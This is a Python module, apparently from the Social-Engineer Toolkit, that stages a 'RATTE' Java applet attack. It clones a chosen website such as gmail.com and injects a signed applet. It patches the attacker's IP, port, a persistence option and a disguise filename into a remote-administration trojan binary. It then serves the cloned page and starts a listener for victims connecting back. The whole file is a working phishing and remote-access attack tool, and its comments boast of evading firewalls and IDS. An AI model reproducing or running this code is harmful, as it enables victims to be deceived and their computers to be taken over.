#!/usr/bin/env python
#
# These are required fields
#
import sys
import subprocess
import os
from src.core import setcore as core

# switch over to import core
#sys.path.append("src/core")
# import the core modules
#try: reload(core)
#except: import core

definepath = os.getcwd()

MAIN=" RATTE Java Applet Attack (Remote Administration Tool Tommy Edition) - Read the readme/RATTE_README.txt first"

#This is RATTE (Remote Administration Tool Tommy Edition) attack module. It will launch a java applet attack to inject RATTE. Then it will launch RATTE-Server and wait for victim to connect. RATTE can beat local Firewalls, IDS and even EAL 4+ certified network firewalls.
#This release one is only for education!"
AUTHOR="   Thomas Werth"

httpd=None

#
# This will start a web server in the directory root you specify, so for example
# you clone a website then run it in that web server, it will pull any index.html file
#
def start_web_server_tw(directory,port):

	global httpd
	try:
		# import the threading, socketserver, and simplehttpserver
		import thread,SocketServer,SimpleHTTPServer
		# create the httpd handler for the simplehttpserver
		# we set the allow_reuse_address incase something hangs can still bind to port
		class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
		# specify the httpd service on 0.0.0.0 (all interfaces) on port 80
		httpd = ReusableTCPServer(("0.0.0.0", port),SimpleHTTPServer.SimpleHTTPRequestHandler)
		# thread this mofo
		thread.start_new_thread(httpd.serve_forever,())
		# change directory to the path we specify for output path
		os.chdir(directory)

        # handle keyboard interrupts
        except KeyboardInterrupt:
                core.PrintInfo("Exiting the SET web server...")
                httpd.socket.close()

	# handle the rest
	#except Exception: 
	#	print "[*] Exiting the SET web server...\n"
	#	httpd.socket.close()
	
def stop_web_server_tw():
	global httpd
	try:
		httpd.socket.close()
	# handle the exception
	except Exception: 		
		httpd.socket.close()
	
#
# This will create the java applet attack from start to finish.
# Includes payload (reverse_meterpreter for now) cloning website
# and additional capabilities.
#
def java_applet_attack_tw(website,port,directory,ipaddr):

	# clone the website and inject java applet
	core.site_cloner(website,directory,"java")

	############################################
	# use customized Ratte nehmen
	############################################

	# this part is needed to rename the msf.exe file to a randomly generated one
	if os.path.isfile("src/program_junk/rand_gen"):
		# open the file
		fileopen=file("src/program_junk/rand_gen", "r")
		# start a loop
		for line in fileopen:
			# define executable name and rename it
			filename=line.rstrip()
			# move the file to the specified directory and filename
			subprocess.Popen("cp src/payloads//ratte/ratte.binary %s/%s 1> /dev/null 2> /dev/null" % (directory,filename), shell=True).wait()


	# lastly we need to copy over the signed applet
	subprocess.Popen("cp src/program_junk/Signed_Update.jar %s 1> /dev/null 2> /dev/null" % (directory), shell=True).wait()

	#TODO index.html parsen und IPADDR:Port ersetzen
	fileopen=open("%s/index.html" % (directory), "rb")
	data=fileopen.read()
	fileopen.close()
	
	filewrite=open("%s/index.html" % (directory), "wb")

	toReplace=core.grab_ipaddress()+":80"

	#replace 3 times
	filewrite.write(data.replace(str(toReplace), ipaddr+":"+str(port), 3) )
	filewrite.close()
	
	# start the web server by running it in the background
	start_web_server_tw(directory,port)

#
# Start ratteserver
#
def ratte_listener_start(port):
	
	
	# launch ratteserver	using ../ cause of reports/ subdir
	#subprocess.Popen("%s/src/set_payloads/ratte/ratteserver %d" % (os.getcwd(),port), shell=True).wait()
	subprocess.Popen("../src/payloads/ratte/ratteserver %d" % (port), shell=True).wait()
		
def prepare_ratte(ipaddr,ratteport, persistent,customexe):
	
	core.PrintStatus("preparing RATTE...")
	# replace ipaddress with one that we need for reverse connection back
	############
	#Load content of RATTE
	############
	fileopen=open("src/payloads/ratte/ratte.binary" , "rb")
	data=fileopen.read()
	fileopen.close()

	############
	#PATCH Server IP into RATTE
	############
	filewrite=open("src/program_junk/ratteM.exe", "wb")

	host=int(len(ipaddr)+1) * "X"
	rPort=int(len(str(ratteport))+1) * "Y"
	pers=int(len(str(persistent))+1) * "Z"
	#check ob cexe > 0, sonst wird ein Feld gepatcht (falsch!)
	if len(str(customexe)) > 0:
		cexe=int(len(str(customexe))+1) * "Q"
	else:
		cexe=""

	filewrite.write(data.replace(str(cexe), customexe+"\x00", 1).replace(str(pers), persistent+"\x00", 1).replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )
	filewrite.close()

# def main(): header is required
def main():
	
	#pause=raw_input("This module has finished completing. Press <enter> to continue")
	
	website = raw_input(core.setprompt(["9", "2"], "Enter website to clone (ex. https://gmail.com)"))
	ipaddr = raw_input(core.setprompt(["9", "2"], "Enter the IP address to connect back on"))
	#javaport must be 80, cause applet uses in web injection port 80 to download payload!
	try:
		javaport = int(raw_input(core.setprompt(["9", "2"], "Port java applet should listen on (ex. 443)")))
		while javaport == 0 or javaport > 65535:
			javaport = int(raw_input(core.setprompt(["9", "2"],"Enter port java applet should listen on")))
	except ValueError:
		javaport = 80
	
	#javaport=80
	
	try:
		ratteport = int(raw_input(core.setprompt(["9", "2"], "Port RATTE Server should listen on")))
		while ratteport == javaport or ratteport == 0 or ratteport > 65535:
			core.PrintWarning("Port must not be equal to javaport!")
			ratteport = int(raw_input(core.setprompt(["9", "2"], "Port RATTE Server should listen on")))
	except ValueError:
		ratteport = 8080
	
	persistent=raw_input(core.setprompt(["9", "2"], "Should RATTE be persistent [no|yes]?"))
	if persistent == "no" or persistent == "" or persistent == "n":
		persistent="NO"
	else:
		persistent="YES"

	customexe=raw_input(core.setprompt(["9", "2"], "Use specifix filename (ex. firefox.exe) [filename.exe or empty]?"))
	#if persistent == "no" or persistent == "" or persistent == "n":
	#	persistent="NO"
	#else:
	#	persistent="YES"
	
	#######################################
	# prepare RATTE
	#######################################

	prepare_ratte(ipaddr,ratteport,persistent,customexe)
	
	######################################
	# Java Applet Attack to deploy RATTE
	#######################################

	core.PrintInfo("Starting java applet attack...")
	java_applet_attack_tw(website,javaport, "reports/",ipaddr)

	fileopen=file("%s/src/program_junk/rand_gen" % (definepath), "r")
        for line in fileopen:
                ratte_random = line.rstrip()
        subprocess.Popen("cp %s/src/program_junk/ratteM.exe %s/reports/%s" % (definepath,definepath,ratte_random), shell=True).wait()

	#######################
	# start ratteserver 
	#######################

	core.PrintInfo("Starting ratteserver...")
	ratte_listener_start(ratteport)
	
	######################
	# stop webserver 
	######################
	stop_web_server_tw()
